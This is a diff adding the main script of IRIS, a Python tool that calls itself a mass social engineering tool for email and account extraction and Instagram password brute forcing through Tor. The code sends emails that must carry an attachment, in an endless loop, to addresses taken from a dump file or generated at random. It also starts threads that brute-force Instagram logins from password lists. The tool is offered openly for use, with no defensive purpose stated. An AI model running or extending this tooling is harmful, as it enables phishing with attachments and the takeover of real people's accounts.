@@ -1,0 +1,75 @@
+#!/usr/bin/python3
+
+"""
+
+Have a good time reading the source. You are an amazing person.
+
+"""
+desc = """
+IRIS
+
+Mass Social Engineering tool and Email and Account Extraction (Random Brute Force Discovery) and Password Brute Force through Tor.
+"""
+from iriscore.core import *
+from iriscore.instagram import *
+import sys
+import time
+import argparse
+import threading
+
+if __name__ == "__main__":
+
+    def MASS_EMAIL_EXECUTE():
+        while(True):
+            try:
+                if(result.dumpfile is not None):
+                    print("[+] Loading Email Dump file '{s}'.".format(s=result.dumpfile))
+                    with open(result.dumpfile, "r") as email_dump:
+                        print("[+] Sending emails to targets from the Email dump file.")
+                        emails = email_dump.readlines()
+                        for email in emails:
+                            send_mail(result.email, result.password, email, result.attachment)
+                else:
+                    email = random_email()[0]
+                    send_mail(result.email, result.password, email, result.attachment)
+            except KeyboardInterrupt:
+                print("[^] EXIT.")
+                break
+                exit(0)
+            except Exception as e:
+                print("[X] Error : " + str(e))
+      
+    try:
+        print(BANNER())
+        parser = argparse.ArgumentParser(
+        description=desc
+        )
+
+        parser.add_argument('-email', dest='email', required=False)
+        parser.add_argument('-password', dest='password', required=False)
+        parser.add_argument('-dumpfile', dest='dumpfile', required=False)
+        parser.add_argument('-attachment',dest='attachment', required=False)
+        parser.add_argument("-discover-instagram", dest='discover',required=False)
+        parser.add_argument("-bruteforce-instagram",dest='instabf', required=False)
+        parser.add_argument("-instagram-user", dest='instauser', required=False)
+        parser.add_argument("-instagram-list", dest='instapasslist', required=False)
+        result, left = parser.parse_known_args()
+
+        if(result.discover is not None):
+            threading.Thread(target=BRUTEFORCE_DISCOVERY).start()
+        elif(result.instabf is not None):
+            if(result.instauser is not None and result.instapasslist is not None):
+                threading.Thread(target=BRUTEFORCE, args=(result.instauser, result.instapasslist)).start()
+            else:
+                print("[X] No Specific Account will be brute Forced because no user or password list was specified.")
+
+        elif(result.email is not None and result.password is not None):
+            if(result.attachment is not None):
+                    threading.Thread(target=MASS_EMAIL_EXECUTE).start()
+            else:
+                print("[X] No Emails will be sent because no Email attachment was specified, Which is required.")
+    
+        else:
+            print("[X] USAGE : ./iris -h")
+    except Exception as e:
+        print("[X] ERROR : " + str(e) )
